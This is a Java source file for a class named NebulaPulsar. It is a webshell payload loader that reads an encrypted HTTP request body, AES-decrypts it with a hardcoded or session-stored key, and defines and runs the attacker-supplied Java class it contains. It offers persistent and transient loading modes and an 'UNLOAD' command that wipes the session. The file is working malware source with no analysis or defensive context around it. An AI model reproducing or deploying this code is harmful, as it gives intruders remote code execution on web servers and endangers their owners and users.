import java.io.*;
import java.lang.reflect.Method;

public class NebulaPulsar extends ClassLoader
{
    private static String m_szKey = "NBPULSARDEADBEEF";

    public NebulaPulsar(ClassLoader objParent) { super(objParent); }
    public NebulaPulsar() { super(NebulaPulsar.class.getClassLoader()); }

    public byte[] Crypt(byte[] abData, int nMode) throws Exception
    {
        javax.crypto.spec.SecretKeySpec objSkeySpec = new javax.crypto.spec.SecretKeySpec(m_szKey.getBytes("UTF-8"), "AES");
        javax.crypto.Cipher objCipher = javax.crypto.Cipher.getInstance("AES/ECB/PKCS5Padding");
        objCipher.init(nMode, objSkeySpec);

        return objCipher.doFinal(abData);
    }

    private String fnGetParamValue(String szParamStr, String szKeyName)
    {
        if (szParamStr == null || szParamStr.isEmpty())
            return "";

        String[] aszPairs = szParamStr.split("&");
        for (String szPair : aszPairs)
        {
            int nIdx = szPair.indexOf("=");
            if (nIdx > 0 && szPair.substring(0, nIdx).equals(szKeyName))
                return szPair.substring(nIdx + 1);
        }

        return "";
    }

    @Override
    public boolean equals(Object objParam) {
        Object objPageContext = objParam; 
        Object objResponse = null;
        Object objRequest = null;

        try
        {
            Method fnGetResponse = objPageContext.getClass().getMethod("getResponse", new Class[0]);
            objResponse = fnGetResponse.invoke(objPageContext, new Object[0]);

            Method fnGetRequest = objPageContext.getClass().getMethod("getRequest", new Class[0]);
            objRequest = fnGetRequest.invoke(objPageContext, new Object[0]);

            Method fnGetContentLength = objRequest.getClass().getMethod("getContentLength", new Class[0]);
            int nContentLength = (Integer)fnGetContentLength.invoke(objRequest, new Object[0]);

            if (nContentLength == 0)
                return true;

            Method fnGetInputStream = objRequest.getClass().getMethod("getInputStream", new Class[0]);
            InputStream isClient = (InputStream)fnGetInputStream.invoke(objRequest, new Object[0]);

            byte[] abEncryptedData = new byte[nContentLength];
            int nReadLength = 0;
            while (nReadLength < nContentLength)
            {
                int nRead = isClient.read(abEncryptedData, nReadLength, nContentLength - nReadLength);
                if (nRead == -1)
                    break;
                nReadLength += nRead;
            }

            Method fnGetSession = objPageContext.getClass().getMethod("getSession", new Class[0]);
            Object objSession = fnGetSession.invoke(objPageContext, new Object[0]);
            Method fnGetAttribute = objSession.getClass().getMethod("getAttribute", String.class);
            Object objKey = fnGetAttribute.invoke(objSession, new Object[] {"k"});
            if (objKey != null)
            {
                String szKey = (String)objKey;
                m_szKey = szKey;
            }

            byte[] abRawPayload = Crypt(abEncryptedData, 2);
            
            int nClassLength = ((abRawPayload[0] & 0xFF) << 24) | ((abRawPayload[1] & 0xFF) << 16) | ((abRawPayload[2] & 0xFF) << 8) | (abRawPayload[3] & 0xFF);
            int nParamOffset = nClassLength + 4;
            int nParamLength = abRawPayload.length - nParamOffset;
            String szParam = new String(abRawPayload, nParamOffset, nParamLength, "UTF-8").trim();
            
            String szAction = fnGetParamValue(szParam, "action");
            if (szAction.equalsIgnoreCase("UNLOAD"))
            {
                Method fnRemoveAttribute = objSession.getClass().getMethod("removeAttribute", new Class[]{String.class});
                fnRemoveAttribute.invoke(objSession, new Object[]{"pulsar_loader"});
                
                Method fnInvalidate = objSession.getClass().getMethod("invalidate", new Class[0]);
                fnInvalidate.invoke(objSession, new Object[0]);
                
                Method fnGetWriter = objResponse.getClass().getMethod("getWriter", new Class[0]);
                PrintWriter pwClient = (PrintWriter)fnGetWriter.invoke(objResponse, new Object[0]);
                pwClient.print("PULSAR_DESTROY_SUCCESS: Memory cleared.");

                return true; 
            }

            byte[] abClassBytes = new byte[nClassLength];
            System.arraycopy(abRawPayload, 4, abClassBytes, 0, nClassLength);
            
            String szTargetMode = fnGetParamValue(szParam, "mode");

            Method fnSetAttribute = objRequest.getClass().getMethod("setAttribute", new Class[]{String.class, Object.class});
            fnSetAttribute.invoke(objRequest, new Object[]{"payload", abRawPayload});
            fnSetAttribute.invoke(objRequest, new Object[]{"len", String.valueOf(nClassLength)});

            Class<?> clazzTarget = null;
            Object objInstance = null;

            if (szTargetMode.equalsIgnoreCase("persistent"))
            {
                try
                {
                    clazzTarget = this.defineClass(abClassBytes, 0, abClassBytes.length);
                }
                catch (LinkageError errDuplicate)
                {
                    clazzTarget = this.findLoadedClass("DarkMatter");
                    if (clazzTarget == null)
                    {
                        clazzTarget = this.loadClass("DarkMatter");
                    }
                }
                objInstance = clazzTarget.newInstance();
            }
            else
            {
                ClassLoader objTransientLoader = new java.net.URLClassLoader(new java.net.URL[0], this);
                java.lang.reflect.Method fnDefineMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                fnDefineMethod.setAccessible(true);
                clazzTarget = (Class<?>)fnDefineMethod.invoke(objTransientLoader, abClassBytes, 0, abClassBytes.length);
                objInstance = clazzTarget.newInstance();
                objTransientLoader = null;
            }

            Method fnEqualsMethod = clazzTarget.getMethod("equals", Object.class);
            fnSetAttribute.invoke(objRequest, new Object[]{"pulsar_loader_instance", this});
            fnEqualsMethod.invoke(objInstance, objParam);
            
            clazzTarget = null;
            objInstance = null;
        }
        catch (Throwable th)
        {
            try
            {
                if (objResponse != null)
                {
                    Method fnGetWriter = objResponse.getClass().getMethod("getWriter", new Class[0]);
                    PrintWriter pwClient = (PrintWriter)fnGetWriter.invoke(objResponse, new Object[0]);
                    pwClient.print("CORE_INTERNAL_ERROR: " + th.toString());
                }
            } 
            catch (Exception ex)
            {
                // do something
            }
        }

        return true;
    }
}